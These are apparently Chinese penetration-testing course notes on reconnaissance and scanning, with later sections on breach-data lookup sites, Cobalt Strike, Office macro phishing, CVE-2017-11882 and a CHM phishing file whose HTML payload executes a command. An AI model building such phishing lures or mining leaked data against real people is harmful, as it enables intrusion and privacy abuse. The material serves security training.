<li>原理：通过字典匹配枚举存在的域名<ul>
<li>工具：</li>
<li><img src="https://pic.imgdb.cn/item/6746d6d7d0e0a243d4d1ea3b.png"></li>
</ul>
</li>
</ul>
<ol start="2">
<li>搜索引擎</li>
</ol>
<ul>
<li><p>原理：通过搜索引擎获取已经爬取的子域名</p>
<ul>
<li><p>语法：Site:163.cn</p>
</li>
<li><p>工具</p>
<ul>
<li><p>theharvester</p>
<ul>
<li>利用google, bing, pgp, linkedin, google-profiles, jigsaw, twitter, 公开信息收集</li>
<li>可以获取子域名，邮箱，主机，员工姓名，开放端口，banner</li>
<li>常用语法：theharvester -d sangfor:com.cn -b al （-b 数据的来源）</li>
</ul>
</li>
<li><p>aquatone</p>
<ul>
<li><p>除了子域爆破，同时还会利用各种开放的互联网服务和资源，来协助其完成子域枚举任务，增加子域名爆破的成功率</p>
</li>
<li><p>aquatone分为三个阶段：发现，扫描，收集</p>
<ul>
<li><p>aquatone-discover 发现<br>  通过获取google、shodan、censys、爆破等多种方式获取目标存在的域名</p>
<p>  常用语法：aquatone-discover -d sangfor.com.cn -t 1  （-t  使用线程数）</p>
</li>
<li><p>aquatone-scan 扫描<br>  经过发现阶段获取到域名，然后扫描域名主机存活和开发端口</p>
<p>  常用语法：aquatone-scan -d sangfor.com.cn -p ‘port’ -t ‘threads’</p>
</li>
<li><p>aquatone-gather 收集<br>  经过扫描以后发现存活的域名和端口，aquatone-gather将自动访问存活的域名并截图</p>
<p>  常用语法:aquatone-gather -d sangfor.com.cn</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<ol start="3">
<li>域传送</li>
</ol>
<ul>
<li>DNS区域传送(DNS zone transfer)指的是一台<u>备用服务器使用来自主服务器的数据刷新自己的域(zone)数据库</u>。为运行中的DNS服务提供了一定的冗余度，目的是为了防止主的域名服务器因意外故障变得不可用时影响到整个域名的解析。</li>
<li>DNS区域传送操作只在网络里真的有备用域名DNS服务器时才有必要用到，但<u>许多DNS服务器却被错误地配置成只要有client发出请求，就会向对方提供个zone数据库</u>的详细信息，所以说允许不受信任的因特网用户执行DNS区域传送(zone transfer)</li>
</ul>
<p>危害：</p>
<p>黑客可以快速的判定出某个特定zone的所有主机，收集域信息，选择攻击目标找出未使用的IP地址，黑客可以绕过基于网络的访问控制</p>
<p>方法：</p>
<ul>
<li>dig @DnsServer（指定某一台域名解析服务器） axfr domain（具体传输的目标域名）</li>
<li>nslookup 进入交互 -&gt; server <em>dns domain</em>  -&gt; ls <em>domain</em></li>
<li>fierce -dns domains</li>
</ul>
<p><img src="https://pic.imgdb.cn/item/6746dd50d0e0a243d4d1ed4c.png"></p>
<ol start="4">
<li>在线网站</li>
</ol>
<ul>
<li><a target="_blank" rel="noopener" href="http://www.virustotal.com/">www.virustotal.com</a></li>
<li>dnsdumpster.com</li>
<li>tool.chinaz.com</li>
</ul>
<p>课堂作业：</p>
<p><img src="https://pic.imgdb.cn/item/6746dda9d0e0a243d4d1ed70.png"></p>
<h4 id="3-4-C段扫描"><a href="#3-4-C段扫描" class="headerlink" title="3.4 C段扫描"></a>3.4 C段扫描</h4><h5 id="C段扫描原因"><a href="#C段扫描原因" class="headerlink" title="C段扫描原因"></a>C段扫描原因</h5><ul>
<li>收集C段内部属于目标的IP地址</li>
<li>内部服务限制只能IP访问，没有映射域名</li>
<li>更多的探测主机目标资产</li>
</ul>
<h5 id="C段扫描方法"><a href="#C段扫描方法" class="headerlink" title="C段扫描方法"></a>C段扫描方法</h5><h6 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h6><ul>
<li>快速扫描大型网络</li>
<li>可以获得主机运行的端口，服务，系统指纹</li>
<li>提供上百个扩展脚本</li>
</ul>
<p><img src="https://pic.imgdb.cn/item/674c42a3d0e0a243d4db9e62.png"></p>
<p><img src="https://pic.imgdb.cn/item/674c42e7d0e0a243d4db9e82.png"></p>
<p><img src="https://pic.imgdb.cn/item/674c433ed0e0a243d4db9e96.png"></p>
<p><img src="https://pic.imgdb.cn/item/674c436ed0e0a243d4db9e9c.png"></p>
<h6 id="Masscan"><a href="#Masscan" class="headerlink" title="Masscan"></a>Masscan</h6><ul>
<li>Masscan号称是最快的互联网端口扫描器，最快可以在六分钟内扫遍互联网，每秒传输1000万个数据包</li>
<li>允许任意地址范围和端口范围</li>
</ul>
<p><img src="https://pic.imgdb.cn/item/674c4435d0e0a243d4db9ebd.png"></p>
<p><img src="https://pic.imgdb.cn/item/674c446cd0e0a243d4db9ecb.png"></p>
<p><img src="https://pic.imgdb.cn/item/674c449ad0e0a243d4db9ed6.png"></p>
<p><img src="https://pic.imgdb.cn/item/674c44c5d0e0a243d4db9ee6.png"></p>
<p><img src="https://pic.imgdb.cn/item/674c44fed0e0a243d4db9ef2.png"></p>
<ul>
<li>Masscan和Namp的结合</li>
</ul>
<p>一般情况下，可以先使用masscan对目标IP(通常是一个网段)进行全端口扫描，然后再使用nmap对存活主机的开放端口进行扫描，找出对应端口服务存在的漏洞</p>
<p>使用masscan对目标IP进行扫描的原因就是因为其速度快于nmap</p>
<h4 id="3-5-Web目录扫描"><a href="#3-5-Web目录扫描" class="headerlink" title="3.5 Web目录扫描"></a>3.5 Web目录扫描</h4><h5 id="目录扫描的原因"><a href="#目录扫描的原因" class="headerlink" title="目录扫描的原因"></a>目录扫描的原因</h5><ul>
<li>寻找到网站后台管理</li>
<li>寻找未授权界面</li>
<li>寻找网站更多隐藏信息</li>
</ul>
<h5 id="目录扫描的方法"><a href="#目录扫描的方法" class="headerlink" title="目录扫描的方法"></a>目录扫描的方法</h5><h6 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h6><ul>
<li>Robots协议 (Robots Exclusion Protocol)“网络爬虫排除标准”，网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。</li>
<li>同时也记录网站所具有基本的目录</li>
</ul>
<h6 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h6><p>搜索引擎会爬取网站下目录，并且不需要触碰网站任何防御设备</p>
<p>语法：site:sangfor.com.cn<br><img src="https://pic.imgdb.cn/item/674c46f2d0e0a243d4db9f22.png"></p>
<h6 id="爆破-及工具"><a href="#爆破-及工具" class="headerlink" title="爆破 及工具"></a>爆破 及工具</h6><ul>
<li>通过字典匹配网站是否返回相应正确状态码，然后列出存在的目录</li>
<li>爆破可能会触发网站防火墙拦截规则，造成IP封禁</li>
</ul>
<p>爆破工具：</p>
<ul>
<li><strong>dirb</strong><ul>
<li>DIRB是一个Web内容扫描程序，通过字典查找WEB服务器的响应，DRIB只能扫描网站目录不能扫描漏洞</li>
<li><img src="https://pic.imgdb.cn/item/674c47f5d0e0a243d4db9f4a.png"></li>
<li><img src="https://pic.imgdb.cn/item/674c482fd0e0a243d4db9f54.png"></li>
</ul>
</li>
<li><strong>dirbuster</strong><ul>
<li>DirBuster多线程Java应用程序，主要扫描服务器上的目录和文件名，扫描方式分为基于字典和纯爆破，OWASP 下开源项目</li>
<li><img src="https://pic.imgdb.cn/item/674c48d7d0e0a243d4db9f74.png"></li>
</ul>
</li>
<li>御剑</li>
</ul>
<h4 id="3-6-指纹识别"><a href="#3-6-指纹识别" class="headerlink" title="3.6 指纹识别"></a>3.6 指纹识别</h4><h5 id="系统指纹识别"><a href="#系统指纹识别" class="headerlink" title="系统指纹识别"></a>系统指纹识别</h5><ol>
<li>方式一  不同操作系统对于处理TCP/IP数据包不相同</li>
</ol>
<p>通过TCP/IP数据包发到目标主机，由于每个操作系统类型对于处理TCP/IP数据包都不相同，所以可以通过之间的差别判定操作系统类型。</p>
<ul>
<li>识别方法</li>
</ul>
<p><img src="https://pic.imgdb.cn/item/674c49e6d0e0a243d4db9fa2.png"></p>
<ol start="2">
<li>方式二 端口服务识别</li>
</ol>
<ul>
<li><p>每个操作系统都有特有的服务和端口，如:</p>
<ul>
<li>windows 桌面连接使用的3389 RDP协议</li>
<li>445端口 windows 的smb协议开启端口</li>
<li>iis 80端口</li>
</ul>
</li>
<li><p>识别方法</p>
</li>
</ul>
<p><img src="https://pic.imgdb.cn/item/674c4ad8d0e0a243d4db9fd3.png"></p>
<p>左右对比，增加了-sV的会显示对应服务的版本，即可以探测系统</p>
<h5 id="中间件指纹识别"><a href="#中间件指纹识别" class="headerlink" title="中间件指纹识别"></a>中间件指纹识别</h5><ul>
<li>方法<ul>
<li>通过<strong>http返回消息</strong>中提取server字段</li>
<li>通过<strong>端口服务</strong>探测中间件</li>
<li>通过<strong>构造错误界面</strong>返回信息查看中间件</li>
</ul>
</li>
</ul>
<ol>
<li>方法一 通过<strong>http返回消息</strong>中提取server字段</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/674c4ba2d0e0a243d4db9fee.png"></p>
<ol start="2">
<li>方法二 通过<strong>端口服务</strong>探测中间件</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/674c4bd8d0e0a243d4db9ff9.png"></p>
<ol start="3">
<li>方法三 通过<strong>构造错误界面</strong>返回信息查看中间件</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/674c4c0bd0e0a243d4db9ffa.png"></p>
<h5 id="Web程序指纹识别"><a href="#Web程序指纹识别" class="headerlink" title="Web程序指纹识别"></a>Web程序指纹识别</h5><ul>
<li>识别目标<ul>
<li>开发语言</li>
<li>开发框架</li>
<li>第三方组件</li>
<li>CMS程序</li>
<li>数据库</li>
</ul>
</li>
</ul>
<ol>
<li>开发语言</li>
</ol>
<ul>
<li>后缀名识别 .asp、.php、jsp</li>
</ul>
<p>如果无法通过后缀名识别，可以通过抓包查看与后台交互点，如：登录，查询</p>
<ul>
<li>http返回消息头 x-Powered-By</li>
<li>cookie：PHPSESSIONID -&gt; php，JSPSESSIONID -&gt; jsp，ASPSESSIONIDAASTCACQ -&gt; asp</li>
</ul>
<ol start="2">
<li>开发框架</li>
</ol>
<ul>
<li>php的thinkphp框架识别方法特定ico图标</li>
<li>Action后缀90%几率struts2或者webwork</li>
<li>do后缀 50%几率spring mvc</li>
<li>url路径/action/xxx70%几率struts2</li>
<li>form后缀 60%几率spring mvc</li>
<li>Vm后缀 90%几率VelocityViewServlet</li>
<li>jsf后缀 99%几率Java Server Faces</li>
</ul>
<ol start="3">
<li>第三方组件</li>
</ol>
<p>一般包括流量统计、文件编辑器、模板引擎</p>
<ul>
<li>识别方法：一般目录扫描<ul>
<li>FCKeditor</li>
<li>CKEditor</li>
</ul>
</li>
</ul>
<ol start="4">
<li>CMS程序</li>
</ol>
<ul>
<li>特定文件夹</li>
</ul>
<p>dede/、admin/admin_Login.aspx</p>
<ul>
<li>Powered by ***</li>
<li>网站favicon图标</li>
</ul>
<ol start="5">
<li>数据库</li>
</ol>
<ul>
<li>常规判断，asp-&gt;sqlserver，php-&gt;mysql，jsp-oracle</li>
<li>网站错误信息</li>
<li>端口服务，1443-&gt;sqlserver，3306-&gt;mysql，oracle-&gt;1521</li>
</ul>
<p><strong>在线探测</strong></p>
<p>方法一：</p>
<p><img src="https://pic.imgdb.cn/item/674c4ec1d0e0a243d4dba085.png"></p>
<p>方法二：</p>
<p><img src="https://pic.imgdb.cn/item/674c4efbd0e0a243d4dba088.png"></p>
<p><img src="https://pic.imgdb.cn/item/674c4f15d0e0a243d4dba08b.png"></p>
<h5 id="防火墙指纹识别"><a href="#防火墙指纹识别" class="headerlink" title="防火墙指纹识别"></a>防火墙指纹识别</h5><ul>
<li>识别方法</li>
</ul>
<p>方法一：Nmap探测，使用脚本</p>
<p><img src="https://pic.imgdb.cn/item/674c4f3bd0e0a243d4dba08f.png"></p>
<p>方法二：SQLmap探测</p>
<p><img src="https://pic.imgdb.cn/item/674c4f92d0e0a243d4dba099.png"></p>
<p>课堂测试：</p>
<p><img src="https://pic.imgdb.cn/item/674c5000d0e0a243d4dba0b4.png"></p>
<h4 id="3-7-GoogleHacking"><a href="#3-7-GoogleHacking" class="headerlink" title="3.7 GoogleHacking"></a>3.7 GoogleHacking</h4><h5 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h5><ul>
<li>使用Google搜索引擎或其他Google应用程序通过特定语法来查找网站配置或代码中的安全漏洞<ul>
<li>搜索登录后台、特定文件、漏洞页面、错误信息等等</li>
</ul>
</li>
</ul>
<h5 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h5><p><img src="https://pic.imgdb.cn/item/674c5557d0e0a243d4dba1d5.png"></p>
<h5 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h5><ul>
<li><p>Intext:key</p>
<ul>
<li>搜索网页带有关键字的页面</li>
</ul>
</li>
<li><p>Allintext:key</p>
<ul>
<li>功能与intext，但是可以接多个关键字</li>
</ul>
</li>
<li><p>intitle:key</p>
<ul>
<li>搜索网页标题中是否有所输入的文字</li>
</ul>
</li>
<li><p>Allintitle:key</p>
<ul>
<li>功能与intext，可以接多个关键字，但不能与别的关键字连用</li>
</ul>
</li>
<li><p>cache:url</p>
<ul>
<li>查看指定URL快照</li>
</ul>
</li>
<li><p>filetype:</p>
<ul>
<li>搜索指定类型文件</li>
</ul>
</li>
<li><p>info:</p>
<ul>
<li>搜索输入URL的摘要信息和其他相关信息,不能与其他关键词混用</li>
</ul>
</li>
<li><p>inurl:</p>
<ul>
<li>搜索输入字符是否存在于URL中,可以与site结合找后台</li>
</ul>
</li>
<li><p>site:</p>
<ul>
<li>搜索特定网站或者子域名</li>
</ul>
</li>
<li><p>related:URL</p>
<ul>
<li>搜索与该URL相关的页面</li>
</ul>
</li>
</ul>
<h5 id="高级案例"><a href="#高级案例" class="headerlink" title="高级案例"></a>高级案例</h5><p><img src="https://pic.imgdb.cn/item/674c6f6bd0e0a243d4dba6dc.png"></p>
<p><img src="https://pic.imgdb.cn/item/674c6fb9d0e0a243d4dba6e3.png"></p>
<p><img src="https://pic.imgdb.cn/item/674c70dfd0e0a243d4dba714.png"></p>
<p><img src="https://pic.imgdb.cn/item/674c7121d0e0a243d4dba71e.png"></p>
<p><img src="https://pic.imgdb.cn/item/674c713fd0e0a243d4dba724.png"></p>
<p><img src="https://pic.imgdb.cn/item/674c7169d0e0a243d4dba733.png"></p>
<p>课堂测试：</p>
<p><img src="https://pic.imgdb.cn/item/674c7196d0e0a243d4dba737.png"></p>
<h4 id="3-8-网络空间搜索引擎"><a href="#3-8-网络空间搜索引擎" class="headerlink" title="3.8 网络空间搜索引擎"></a>3.8 网络空间搜索引擎</h4><h5 id="网络空间搜索引擎介绍"><a href="#网络空间搜索引擎介绍" class="headerlink" title="网络空间搜索引擎介绍"></a>网络空间搜索引擎介绍</h5><ul>
<li>网络空间搜索引擎不同于搜索普通网页，而是直接<strong>搜索网络中存在主机</strong>，将主机信息汇聚成数据库，然后显示出<strong>主机的IP、端口、中间件、摄像头，工控设备banner</strong>等其他网络设备信息。</li>
<li><strong>按照普通搜索引擎规则来搜索网络设备</strong>，如：ip：”192.168.1.0”</li>
</ul>
<h5 id="常见搜索引擎"><a href="#常见搜索引擎" class="headerlink" title="常见搜索引擎"></a>常见搜索引擎</h5><ul>
<li>国外<ul>
<li>shodan</li>
</ul>
</li>
<li>国内<ul>
<li>zoomeye</li>
<li>fofa</li>
</ul>
</li>
</ul>
<h5 id="shodan"><a href="#shodan" class="headerlink" title="shodan"></a>shodan</h5><ul>
<li>Shodan是国外人员开发<strong>网络空间搜索引擎</strong></li>
<li>Shodan可以说是一款“黑暗”谷歌，一刻不停的在寻找着所有和互联网关联的<strong>服务器、摄像头、打印机、路由器</strong>等。</li>
<li>凡是连接到互联网的<strong>红绿灯、安全摄像头、家庭自动化设备</strong>以及<strong>加热系统</strong>等都会被轻易的搜索到。</li>
</ul>
<h6 id="基本语法-1"><a href="#基本语法-1" class="headerlink" title="基本语法"></a>基本语法</h6><p><img src="https://pic.imgdb.cn/item/674d6d52d0e0a243d4dbe3a5.png"></p>
<p><img src="https://pic.imgdb.cn/item/674d6fe4d0e0a243d4dbe448.png"></p>
<h6 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h6><p><img src="https://pic.imgdb.cn/item/674d701cd0e0a243d4dbe45d.png"></p>
<p><img src="https://pic.imgdb.cn/item/674d7068d0e0a243d4dbe473.png"></p>
<p><img src="https://pic.imgdb.cn/item/674d708cd0e0a243d4dbe47e.png"></p>
<p><img src="https://pic.imgdb.cn/item/674d70ffd0e0a243d4dbe4ad.png"></p>
<p><img src="https://pic.imgdb.cn/item/674d7198d0e0a243d4dbe4ee.png"></p>
<p><img src="https://pic.imgdb.cn/item/674d71cbd0e0a243d4dbe509.png"></p>
<p><img src="https://pic.imgdb.cn/item/674d71e4d0e0a243d4dbe50e.png"></p>
<p><img src="https://pic.imgdb.cn/item/674d71f8d0e0a243d4dbe522.png"></p>
<p><img src="https://pic.imgdb.cn/item/674d7237d0e0a243d4dbe549.png"></p>
<p><img src="https://pic.imgdb.cn/item/674d7255d0e0a243d4dbe558.png"></p>
<p><img src="https://pic.imgdb.cn/item/674d7339d0e0a243d4dbe5a2.png"></p>
<p>课堂测试：</p>
<p><img src="https://pic.imgdb.cn/item/674d7378d0e0a243d4dbe5ba.png"></p>
<h4 id="3-9-情报分析"><a href="#3-9-情报分析" class="headerlink" title="3.9 情报分析"></a>3.9 情报分析</h4><h5 id="情报分析概念"><a href="#情报分析概念" class="headerlink" title="情报分析概念"></a>情报分析概念</h5><ul>
<li>广义上情报分析是对全源数据进行综合、评估、分析和解读，将处理过的信息转化为情报以满足已知或预期用户需求的过程。</li>
<li>实际上对于网络空间情报分析主要对于目标的ip,域名，电话，邮箱位置，员工，公司出口网络，内部网络等等进行收集，然后进行综合判断整理汇聚成数据库</li>
</ul>
<h5 id="Maltego"><a href="#Maltego" class="headerlink" title="Maltego"></a>Maltego</h5><ul>
<li><p>Maltego是一种独特的工具，它对互联网上的信息进行收集、组织，并将这些信息显示在适于执行链路分析的、基于节点的图形上。</p>
</li>
<li><p>在kali中默认安装了maltego软件，可以直接在终端输入maltego进行启动</p>
</li>
<li><p>首次使用maltego需要注册</p>
<ul>
<li>注册网站:<br>  <a target="_blank" rel="noopener" href="https://www.paterva.com/web7/buy/maltego-clients/maltego-ce.php">https://www.paterva.com/web7/buy/maltego-clients/maltego-ce.php</a></li>
</ul>
</li>
</ul>
<p><img src="https://pic.imgdb.cn/item/674d75d2d0e0a243d4dbe6e0.png"></p>
<p>信息收集方法：</p>
<p><img src="https://pic.imgdb.cn/item/674d7659d0e0a243d4dbe71b.png"></p>
<p><img src="https://pic.imgdb.cn/item/674d7699d0e0a243d4dbe729.png"></p>
<p><img src="https://pic.imgdb.cn/item/674d76c6d0e0a243d4dbe735.png"></p>
<p>深入探测：</p>
<p><img src="https://pic.imgdb.cn/item/674d773ad0e0a243d4dbe749.png"></p>
<p><img src="https://pic.imgdb.cn/item/674d7773d0e0a243d4dbe760.png"></p>
<p><img src="https://pic.imgdb.cn/item/674d77c8d0e0a243d4dbe78a.png"></p>
<p>生成报告</p>
<p><img src="https://pic.imgdb.cn/item/674d7801d0e0a243d4dbe7b1.png"></p>
<h4 id="3-10-社工库和多维度信息收集"><a href="#3-10-社工库和多维度信息收集" class="headerlink" title="3.10 社工库和多维度信息收集"></a>3.10 社工库和多维度信息收集</h4><h5 id="社工库-1"><a href="#社工库-1" class="headerlink" title="社工库"></a>社工库</h5><ul>
<li><p>将互联网泄露的信息汇聚成数据库，简单说：黑客数据库</p>
</li>
<li><p>社工库网址<br>  <a target="_blank" rel="noopener" href="https://www.reg007.com/">https://www.reg007.com/</a>      邮箱、手机号注册过哪些网站<br>  <a target="_blank" rel="noopener" href="https://haveibeenpwned.com/">https://haveibeenpwned.com/</a>   邮箱是否被泄露<br>  <a target="_blank" rel="noopener" href="https://snusbase.com/search">https://snusbase.com/search</a>    邮箱、用户名、IP地址、HASH<br>  <a target="_blank" rel="noopener" href="http://163.donothackme.club/">http://163.donothackme.club/</a><br>  <a target="_blank" rel="noopener" href="http://s.70sec.com/">http://s.70sec.com/</a><br>  <a target="_blank" rel="noopener" href="http://2017.findmima.com/">http://2017.findmima.com</a><br>  <a target="_blank" rel="noopener" href="https://gq.findmima.com/">https://gq.findmima.com/</a><br>  <a target="_blank" rel="noopener" href="http://cha.hx99.net/">http://cha.hx99.net/</a><br>  <a target="_blank" rel="noopener" href="http://sgk.70sec.com/index.php">http://sgk.70sec.com/index.php</a><br>  <a target="_blank" rel="noopener" href="https://www,shuju666.com/Home/Profile">https://www,shuju666.com/Home/Profile</a></p>
</li>
<li><p>构建社工库<br>  <a target="_blank" rel="noopener" href="https://raidforums.com/Announcement-Database-Index-CLICK-ME">https://raidforums.com/Announcement-Database-Index-CLICK-ME</a></p>
</li>
</ul>
<p><img src="https://pic.imgdb.cn/item/674d7a5bd0e0a243d4dbe8d6.png"></p>
<h5 id="多维度信息收集"><a href="#多维度信息收集" class="headerlink" title="多维度信息收集"></a>多维度信息收集</h5><ul>
<li>通过app</li>
<li>通过微信公众号</li>
<li>通过目标qq群</li>
<li>通过威胁情报</li>
<li>通过网站开发者角度</li>
<li>通过运维角度</li>
<li>通过架构师角度去获得目标相关信息</li>
</ul>
<p><img src="https://pic.imgdb.cn/item/674d7b56d0e0a243d4dbea19.png"></p>
<p><img src="https://pic.imgdb.cn/item/674d7b9cd0e0a243d4dbeae6.png"></p>
<p><img src="https://pic.imgdb.cn/item/674d7bcfd0e0a243d4dbeb78.png"></p>
<p><img src="https://pic.imgdb.cn/item/674d7c83d0e0a243d4dbed7f.png"></p>
<p><img src="https://pic.imgdb.cn/item/674d7ccad0e0a243d4dbee1e.png"></p>
<p><img src="https://pic.imgdb.cn/item/674d7ce8d0e0a243d4dbee74.png"></p>
<p><img src="https://pic.imgdb.cn/item/674d7d10d0e0a243d4dbeecd.png"></p>
<p><img src="https://pic.imgdb.cn/item/674d7d23d0e0a243d4dbeed5.png"></p>
<h4 id="3-11-CobaltStrike配置"><a href="#3-11-CobaltStrike配置" class="headerlink" title="3.11 CobaltStrike配置"></a>3.11 CobaltStrike配置</h4><h5 id="Cobalt-Strike介绍"><a href="#Cobalt-Strike介绍" class="headerlink" title="Cobalt Strike介绍"></a>Cobalt Strike介绍</h5><ul>
<li>Cobalt Strike是一款渗透测试软件，分为客户端与服务端，可以进行团队分布式操作<br>  服务端:1个<br>  客户端:N个</li>
<li>Cobalt Strike集成了功能和模块<ul>
<li>端口转发</li>
<li>站点克隆</li>
<li>Windows exe程序生成</li>
<li>Windows dll动态链接库生成</li>
<li>java程序生成</li>
<li>office宏代码生成</li>
</ul>
</li>
</ul>
<h5 id="Cobalt-Strike安装配置"><a href="#Cobalt-Strike安装配置" class="headerlink" title="Cobalt Strike安装配置"></a>Cobalt Strike安装配置</h5><p>环境：kali</p>
<p>服务端与客户端均需要安装java环境</p>
<p><img src="https://pic.imgdb.cn/item/674dbd3bd0e0a243d4dc33d8.png"></p>
<p>服务端：</p>
<p><img src="https://pic.imgdb.cn/item/674dbd67d0e0a243d4dc33de.png"></p>
<p>./teamserver	服务端IP地址	密码</p>
<p>客户端：</p>
<p><img src="https://pic.imgdb.cn/item/674dbe08d0e0a243d4dc340b.png"></p>
<p><img src="https://pic.imgdb.cn/item/674dbe2ed0e0a243d4dc3412.png"></p>
<p><img src="https://pic.imgdb.cn/item/674dbeacd0e0a243d4dc3456.png"></p>
<h5 id="Cobalt-Strike使用"><a href="#Cobalt-Strike使用" class="headerlink" title="Cobalt Strike使用"></a>Cobalt Strike使用</h5><p>第一步：</p>
<p><img src="https://pic.imgdb.cn/item/674dbebdd0e0a243d4dc345f.png"></p>
<p>第二步：</p>
<p><img src="https://pic.imgdb.cn/item/674dbef1d0e0a243d4dc3476.png"></p>
<p>第三步：</p>
<p><img src="https://pic.imgdb.cn/item/674dbf37d0e0a243d4dc3486.png"></p>
<p><img src="https://pic.imgdb.cn/item/674dbf6ed0e0a243d4dc3493.png"></p>
<h4 id="3-12-office钓鱼"><a href="#3-12-office钓鱼" class="headerlink" title="3.12 office钓鱼"></a>3.12 office钓鱼</h4><h5 id="office钓鱼介绍"><a href="#office钓鱼介绍" class="headerlink" title="office钓鱼介绍"></a>office钓鱼介绍</h5><ul>
<li>在无需交互、用户无感知的情况下，执行Office文档中<strong>内嵌的一段恶意代码</strong>，从远控地址中下载并运行恶意可执行程序。例如：远控木马或者勒索病毒等</li>
</ul>
<h5 id="CobaltStrike钓鱼"><a href="#CobaltStrike钓鱼" class="headerlink" title="CobaltStrike钓鱼"></a>CobaltStrike钓鱼</h5><ul>
<li><p>Cobalt Strike office钓鱼主要方法是生成一段vba代码，然后将代码复制到office 套件中，当用户启动office自动运行</p>
</li>
<li><p>Cobalt Strike操作</p>
<ul>
<li>点击Cobalt Strike主界面中attacks-&gt;packages-&gt;ms office macro</li>
<li>弹出界面选择Listener，单击确定</li>
<li>对话框中给出每一步仔细操作，单击copymacro按钮</li>
</ul>
</li>
<li><p>word操作</p>
<ul>
<li>点击上方标签视图标签</li>
<li>在该标签中点击宏按钮，弹出的对话框中输入宏名字，然后单击创建按钮<ul>
<li><img src="https://pic.imgdb.cn/item/674dc148d0e0a243d4dc3517.png"></li>
</ul>
</li>
<li>首先清空所有代码，然后将复制的代码粘贴到编辑器中，关闭宏编辑窗口</li>
<li>保存退出</li>
<li>双击再次运行保存的文档</li>
</ul>
</li>
</ul>
<p><img src="https://pic.imgdb.cn/item/674dc198d0e0a243d4dc352e.png"></p>
<p><img src="https://pic.imgdb.cn/item/674dc1b8d0e0a243d4dc3535.png"></p>
<h5 id="CVE-2017-11882"><a href="#CVE-2017-11882" class="headerlink" title="CVE-2017-11882"></a>CVE-2017-11882</h5><ul>
<li><p>漏洞为Office内存破坏漏洞，影响目前流行的所有Office版本。攻击者可以利用漏洞以当前登录的用户的身份执行任意命令。</p>
</li>
<li><p>该漏洞出现在模块EQNEDT32.EXE中，属于栈溢出漏洞，是对Equation Native 数据结构处理不当导致。</p>
</li>
<li><p>漏洞影响</p>
<ul>
<li>Microsoft Office 2007</li>
<li>Microsoft Office 2010</li>
<li>Microsoft Office 2013</li>
<li>Microsoft Office 2016</li>
</ul>
</li>
<li><p>复现过程</p>
<ul>
<li>exploit<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Ridter/CVE-2017-11882">https://github.com/Ridter/CVE-2017-11882</a></li>
</ul>
</li>
<li>虽然是栈溢出漏洞，但是该漏洞对于命令有限制，分为可以执行43b和执行109b，所以在利用过程需要注意命令长度。</li>
</ul>
</li>
</ul>
<p><img src="https://pic.imgdb.cn/item/674dc270d0e0a243d4dc356c.png"></p>
<h4 id="3-13-钓鱼"><a href="#3-13-钓鱼" class="headerlink" title="3.13 钓鱼"></a>3.13 钓鱼</h4><h5 id="CHM钓鱼"><a href="#CHM钓鱼" class="headerlink" title="CHM钓鱼"></a>CHM钓鱼</h5><ol>
<li>介绍</li>
</ol>
<ul>
<li>CHM(Compiled Help Manual)即“已编译的帮助文件”。它是微软新一代的帮助文件格式，利用HTML作源文，把帮助内容以类似数据库的形式编译储存。</li>
<li>利用CHM钓鱼主要原因是因为该文档可以执行cmd命令</li>
</ul>
<ol start="2">
<li>CHM制作</li>
</ol>
<ul>
<li>软件：EasyCHM</li>
</ul>
<ol start="3">
<li>制作过程</li>
</ol>
<ul>
<li>首先创建一个根目录，文件名任意</li>
<li>在文件内部创建两个目录和一个index.html文件</li>
<li>两个文件夹内部创建任意文件名的html文件</li>
</ul>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">将下列代码复制到index.html文件中</span><br><span class="line">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt; &lt;head&gt; &lt;/head&gt;&lt;body&gt;</span><br><span class="line">command exec</span><br><span class="line">&lt;OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1&gt;</span><br><span class="line">&lt;PARAM name="Command" value="ShortCut"&gt;</span><br><span class="line">&lt;PARAM name="Button" value="Bitmap::shortcut"&gt;</span><br><span class="line">&lt;PARAM name="ltem1" value=',calc.exe'&gt;</span><br><span class="line">&lt;PARAM name="ltem2" value="273,1,1"&gt;</span><br><span class="line">&lt;/OBJECT&gt;</span><br><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">x.Click();</span><br><span class="line">&lt;/SCRIPT&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure>

<ul>
<li>启动EasyCHM软件</li>
<li>点击工具栏新建按钮，弹出的对话框中点击浏览按钮，选择创建的根目录，文件类型保持一致，点击确定</li>
<li>点击工具栏编译按钮，弹出的对话框中点击生成CHM按钮</li>
</ul>
<img src="https://pic.imgdb.cn/item/674dcb43d0e0a243d4dc372b.png" style="zoom:67%;">

<ol start="4">
<li>CS中钓鱼文件生成</li>
</ol>
<ul>
<li>启动Cobalt Strike软件</li>
<li>点击菜单attasks-&gt;web Drive by-&gt;scripted web Delivery</li>
<li>弹出的对话框中，type类型设置powershel，单击launch按钮</li>
<li>用代码将index.html中calc.exe替换</li>
</ul>
<p>替换注意问题：</p>
<p><img src="https://pic.imgdb.cn/item/674dcbdad0e0a243d4dc3761.png"></p>
<p>示例代码：</p>
